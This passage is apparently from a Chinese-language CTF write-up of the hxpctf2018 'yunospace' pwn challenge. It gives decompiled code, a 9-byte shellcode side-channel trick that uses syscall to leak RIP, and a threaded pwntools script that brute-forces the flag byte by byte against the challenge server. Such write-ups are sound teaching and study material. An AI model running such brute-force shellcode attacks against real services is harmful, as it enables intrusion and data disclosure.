v7 = *arg1__++ == <span class="number">0</span>;</span><br><span class="line">      --v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v7 );</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">-3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *arg1_ = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( getrandom((__int64)&amp;rand, <span class="number">6LL</span>, <span class="number">0LL</span>) == <span class="number">6</span> &amp;&amp; getrandom((__int64)&amp;addr, <span class="number">6LL</span>, <span class="number">0LL</span>) == <span class="number">6</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = getpagesize();</span><br><span class="line">        v9 = v8;</span><br><span class="line">        v10 = -v8;</span><br><span class="line">        rand = (<span class="keyword">void</span> *)(v10 &amp; (<span class="keyword">unsigned</span> __int64)rand &amp; <span class="number">0xFFFF7FFFFFFFFFFF</span>LL);</span><br><span class="line">        addr = (<span class="keyword">void</span> *)(v10 &amp; (<span class="keyword">unsigned</span> __int64)addr &amp; <span class="number">0xFFFF7FFFFFFFFFFF</span>LL);</span><br><span class="line">        <span class="keyword">if</span> ( mmap(rand, v8, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>) != (<span class="keyword">void</span> *)<span class="number">-1LL</span> &amp;&amp; mmap(addr, v9, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>) != (<span class="keyword">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          *(_WORD *)rand = <span class="number">-16335</span>;</span><br><span class="line">          v11 = (<span class="keyword">char</span> *)rand;</span><br><span class="line">          v12 = <span class="built_in">stdin</span>;</span><br><span class="line">          *((_BYTE *)rand + <span class="number">11</span>) = *arg1;</span><br><span class="line">          v13 = fileno(v12);</span><br><span class="line">          read(v13, v11 + <span class="number">2</span>, <span class="number">9uLL</span>);</span><br><span class="line">          mprotect(rand, v9, <span class="number">5</span>);</span><br><span class="line">          JUMPOUT(__CS__, rand);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;:(&quot;</span>);</span><br><span class="line">  _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单来说，程序用mmap分配了两个随机的地址空间，一个用来放写入的机器码，一个用来作为栈空间（为了防止栈中的信息泄漏）</p>
+<p>然后程序允许我们写入9Byte的机器码，并执行这9Byte。但是注意，1Byte的flag被写入到9Byte的机器码之后了<code>          *((_BYTE *)rand + 11) = *arg1;</code> 所以我们如果能写入机器码把这1Byte用某种方式确定出来，就可以获得flag。</p>
+<p>然而出题人是个狠人。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000009CA                 xor     rax, rax</span><br><span class="line">.text:00000000000009CD                 xor     rcx, rcx</span><br><span class="line">.text:00000000000009D0                 xor     rdx, rdx</span><br><span class="line">.text:00000000000009D3                 xor     rbx, rbx</span><br><span class="line">.text:00000000000009D6                 xor     rbp, rbp</span><br><span class="line">.text:00000000000009D9                 xor     rsi, rsi</span><br><span class="line">.text:00000000000009DC                 xor     rdi, rdi</span><br><span class="line">.text:00000000000009DF                 xor     r8, r8</span><br><span class="line">.text:00000000000009E2                 xor     r9, r9</span><br><span class="line">.text:00000000000009E5                 xor     r10, r10</span><br><span class="line">.text:00000000000009E8                 xor     r11, r11</span><br><span class="line">.text:00000000000009EB                 xor     r12, r12</span><br><span class="line">.text:00000000000009EE                 xor     r13, r13</span><br><span class="line">.text:00000000000009F1                 xor     r14, r14</span><br><span class="line">.text:00000000000009F4                 xor     r15, r15</span><br><span class="line">.text:00000000000009F7                 pop     rax</span><br><span class="line">.text:00000000000009F8                 pop     rsp</span><br><span class="line">.text:00000000000009F9                 jmp     rax</span><br></pre></td></tr></table></figure>
+
+<p>在跳转到用户输入的code执行之前，清空了所有寄存器，并把esp也指向了分配的随机空间。也就是说我们<strong>拿不到任何地址信息，也无法调用函数</strong>。</p>
+<p><img src="/2018/12/hxpctf2018-pwn/1545374656272.png" alt="1545374656272"></p>
+<p>如上图，我写入了9Byte nop指令，可以看到，在跳转到我们写入的code之前，所有寄存器都已经清零，且跳转之后RAX也清零。RSP指向的是mmap分配的随机区域。</p>
+<p><img src="/2018/12/hxpctf2018-pwn/1545374793589.png" alt="1545374793589"></p>
+<p>我们可以看到，写入的9个 0x90之后，有一个字节0x66。这一个字节就是flag。我们要想办法确定该字节的值。</p>
+<p>我的思路是：先拿到RIP的地址，然后通过类似 <code>mov al, BYTE PTR[RIP+xx]</code> 的方式将flag读入寄存器。</p>
+<p>第一个问题是：1Byte的flag读入寄存器之后，如何向外反馈？想起来很久以前听杨栩翔说他听鸡哥说的利用 <code>cmp al, bl</code> ，如果相等就用<code>jmp xxx</code>进入死循环，如果不相等就让程序直接崩掉。通过检测程序是否存活来判断该1Byte的flag是什么。总之就是要爆破。</p>
+<p>第二个问题是：所有涉及到 RIP的指令，指令长度都暴增… 类似刚才的指令就需要5Byte，后续的工作没法进行了。这个卡了我很久。后来我尝试有没有什么能用的系统调用。后来发现，如果调用了系统调用，RCX会保存下一条要执行的指令（即RIP的值）。而且<code>syscall</code> 指令只需要2Byte。</p>
+<p>据此，写入的code如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">syscall</span><br><span class="line">	p:</span><br><span class="line">	mov al, [rcx+7] </span><br><span class="line">	cmp al, 0xaa</span><br><span class="line">	je p</span><br></pre></td></tr></table></figure>
+
+<p>0xaa表示的是flag的值。我遍历尝试所有的可见字符，如果在某个字符处程序进入了死循环而没有崩溃，就说明本次尝试的字符是对的。</p>
+<p>调试脚本花费了很多时间，因为太慢又加了线程。</p>
+<p><strong>利用脚本：</strong></p>
+<p>注：<code>explode(num, idx)</code> 表示要尝试的字符ascii是num，测试的是flag的第idx个字节</p>
+<p><code>expb(idx)</code> 表示爆破flag的第idx个字节。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">explode</span>(<span class="params">num, idx</span>):</span></span><br><span class="line">	<span class="comment"># p = process(argv=[&quot;./yunospace_p&quot;, &#x27;f&#x27;])</span></span><br><span class="line">	p = remote(<span class="string">&#x27;195.201.127.119&#x27;</span>, <span class="number">8664</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;for you today?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;please.&#x27;</span>)</span><br><span class="line">	<span class="comment">#code = &#x27;&#x27;&#x27;</span></span><br><span class="line">	<span class="comment">#syscall</span></span><br><span class="line">	<span class="comment">#p:</span></span><br><span class="line">	<span class="comment">#mov al, [rcx+7] </span></span><br><span class="line">	<span class="comment">#cmp al, &#123;&#125;</span></span><br><span class="line">	<span class="comment">#je p</span></span><br><span class="line">	<span class="comment">#&#x27;&#x27;&#x27;.format(hex(num))</span></span><br><span class="line">	asmcode = <span class="string">&#x27;\x0f\x05\x8aA\x07&lt;&#x27;</span>+<span class="built_in">chr</span>(num)+<span class="string">&#x27;t\xf9&#x27;</span></span><br><span class="line"></span><br><span class="line">	p.send(asmcode)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p.recvline()</span><br><span class="line">		<span class="built_in">print</span> p.recv(timeout=<span class="number">1.5</span>)</span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		ret = <span class="string">&#x27;EEE&#x27;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		ret = <span class="built_in">chr</span>(num)</span><br><span class="line">	p.close()</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&#x27;\x00&#x27;</span>]*<span class="number">100</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">expb</span>(<span class="params">idx</span>):</span></span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">		ret = explode(c, idx)</span><br><span class="line">		<span class="keyword">if</span> ret != <span class="string">&#x27;EEE&#x27;</span>:</span><br><span class="line">			<span class="comment"># flag[idx] = ret</span></span><br><span class="line">			flag[idx] = ret</span><br><span class="line">			<span class="built_in">print</span> ret</span><br><span class="line">			<span class="keyword">return</span> ret</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MAX = <span class="number">58</span></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, MAX):</span><br><span class="line">	t = threading.Thread(target=expb,args=(i,))</span><br><span class="line">	threads.append(t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, MAX):</span><br><span class="line">	threads[i].start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, MAX):   </span><br><span class="line">	threads[i].join()</span><br><span class="line">	<span class="built_in">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line"></span><br><span class="line">fp.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最后爆破出来的结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">[&#x27;h&#x27;, &#x27;x&#x27;, &#x27;p&#x27;, &#x27;\x00&#x27;, &#x27;\x00&#x27;, &#x27;0&#x27;, &#x27;u&#x27;, &#x27;_&#x27;, &#x27;w&#x27;, &#x27;0&#x27;, &#x27;u&#x27;, &#x27;l&#x27;, &#x27;d&#x27;, &#x27;n&#x27;, &#x27;t&#x27;, &#x27;_&#x27;, &#x27;b&#x27;, &#x27;3&#x27;, &#x27;l&#x27;, &#x27;1&#x27;, &#x27;3&#x27;, &#x27;v&#x27;, &#x27;3&#x27;, &#x27;_&#x27;, &#x27;h&#x27;, &#x27;0&#x27;, &#x27;w&#x27;, &#x27;_&#x27;, &#x27;m&#x27;, &#x27;4&#x27;, &#x27;n&#x27;, &#x27;\x00&#x27;, &#x27;_&#x27;, &#x27;3&#x27;, &#x27;m&#x27;, &#x27;u&#x27;, &#x27;l&#x27;, &#x27;a&#x27;, &#x27;t&#x27;, &#x27;0&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;_&#x27;, &#x27;g&#x27;, &#x27;0&#x27;, &#x27;t&#x27;, &#x27;_&#x27;, &#x27;t&#x27;, &#x27;h&#x27;, &#x27;1&#x27;, &#x27;s&#x27;, &#x27;_&#x27;, &#x27;w&#x27;, &#x27;r&#x27;, &#x27;0&#x27;, &#x27;n&#x27;, &#x27;g&#x27;,</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># hxp&#123;*0u_w0uldnt_b3l13v3_h0w_m4n*_3mulat0rs_g0t_th1s_wr0ng&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大概猜了一下，*的地方应该是y，试了一下就过了。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HXPCTF2018-PWN-Rev"><span class="toc-number">1.</span> <span class="toc-text">HXPCTF2018 - PWN&#x2F;Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#angrme"><span class="toc-number">1.1.</span> <span class="toc-text">angrme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poor-canary"><span class="toc-number">1.2.</span> <span class="toc-text">poor_canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#yunospace"><span class="toc-number">1.3.</span> <span class="toc-text">yunospace</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/12/hxpctf2018-pwn/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/12/hxpctf2018-pwn/&text=【题解】hxpctf2018-pwn"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/12/hxpctf2018-pwn/&title=【题解】hxpctf2018-pwn"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/12/hxpctf2018-pwn/&is_video=false&description=【题解】hxpctf2018-pwn"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【题解】hxpctf2018-pwn&body=Check out this article: http://example.com/2018/12/hxpctf2018-pwn/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/12/hxpctf2018-pwn/&title=【题解】hxpctf2018-pwn"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/12/hxpctf2018-pwn/&title=【题解】hxpctf2018-pwn"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/12/hxpctf2018-pwn/&title=【题解】hxpctf2018-pwn"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/12/hxpctf2018-pwn/&title=【题解】hxpctf2018-pwn"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/12/hxpctf2018-pwn/&name=【题解】hxpctf2018-pwn&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/12/hxpctf2018-pwn/&t=【题解】hxpctf2018-pwn"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Amjac
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
